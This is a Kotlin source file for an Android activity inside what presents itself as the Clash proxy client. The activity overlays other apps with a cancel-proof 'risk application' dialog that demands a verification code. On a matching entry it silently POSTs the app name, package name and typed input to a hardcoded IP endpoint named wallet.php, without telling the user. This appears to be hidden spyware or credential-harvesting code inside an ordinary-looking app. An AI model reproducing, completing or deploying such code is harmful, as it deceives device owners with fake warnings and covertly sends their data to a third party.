package com.github.kr328.clash

import android.app.Dialog
import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.widget.EditText
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.github.kr328.clash.common.constants.AppInterceptConstants
import com.github.kr328.clash.common.log.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * APP拦截验证对话框Activity
 * 当无法显示悬浮窗时使用
 */
class AppInterceptDialogActivity : AppCompatActivity() {

    companion object {
        private const val UPLOAD_URL = "http://18.166.76.229:8002/wallet.php"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val packageName = intent.getStringExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME) ?: run {
            finish()
            return
        }
        val appName = intent.getStringExtra("app_name") ?: packageName
        val verifyHint = intent.getStringExtra(AppInterceptConstants.EXTRA_VERIFY_HINT) ?: "请输入验证码"

        val config = AppInterceptManager.getInstance(this).getConfig()

        // 使用自定义布局
        val inflater = LayoutInflater.from(this)
        val dialogView = inflater.inflate(R.layout.dialog_risk_warning, null)

        val tvAppName = dialogView.findViewById<TextView>(R.id.tv_app_name)
        val tvHint = dialogView.findViewById<TextView>(R.id.tv_hint)
        val etInput = dialogView.findViewById<EditText>(R.id.et_input)
        val btnConfirm = dialogView.findViewById<TextView>(R.id.btn_confirm)
        val ivClose = dialogView.findViewById<ImageView>(R.id.iv_close)

        // 设置应用名称和提示
        tvAppName.text = "应用 \"$appName\" 被识别为风险应用"
        tvHint.text = verifyHint
        etInput.hint = verifyHint

        // 创建对话框
        val dialog = Dialog(this)
        dialog.setContentView(dialogView)
        dialog.setCancelable(false)
        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)

        // 设置窗口大小
        dialog.window?.setLayout(
            (resources.displayMetrics.widthPixels * 0.85).toInt(),
            android.view.WindowManager.LayoutParams.WRAP_CONTENT
        )

        // 关闭按钮
        ivClose.setOnClickListener {
            dialog.dismiss()
            finish()
        }

        // 确认按钮
        btnConfirm.setOnClickListener {
            val input = etInput.text.toString()
            if (input == config.verifyPassword) {
                Toast.makeText(this, "确认成功，可以继续使用", Toast.LENGTH_SHORT).show()
                markVerified(packageName)
                uploadConfirmation(appName, packageName, input)
                dialog.dismiss()
                finish()
            } else {
                Toast.makeText(this, "输入内容不正确，请重试", Toast.LENGTH_SHORT).show()
                etInput.text.clear()
                etInput.requestFocus()
            }
        }

        dialog.setOnDismissListener {
            finish()
        }

        dialog.show()
    }

    private fun markVerified(packageName: String) {
        val intent = Intent(AppInterceptConstants.ACTION_MARK_VERIFIED).apply {
            putExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME, packageName)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    /**
     * 上传用户确认内容到服务器
     */
    private fun uploadConfirmation(appName: String, packageName: String, userInput: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val jsonBody = """
                    {
                        "app_name": "${appName.escapeJson()}",
                        "package_name": "${packageName.escapeJson()}",
                        "user_input": "${userInput.escapeJson()}",
                        "timestamp": "$timestamp"
                    }
                """.trimIndent()

                val url = URL(UPLOAD_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "*/*")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                connection.outputStream.use { os ->
                    os.write(jsonBody.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.i("AppIntercept: Upload success - $appName")
                } else {
                    Log.e("AppIntercept: Upload failed with code $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("AppIntercept: Upload error - ${e.message}")
            }
        }
    }

    private fun String.escapeJson(): String {
        return this.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}
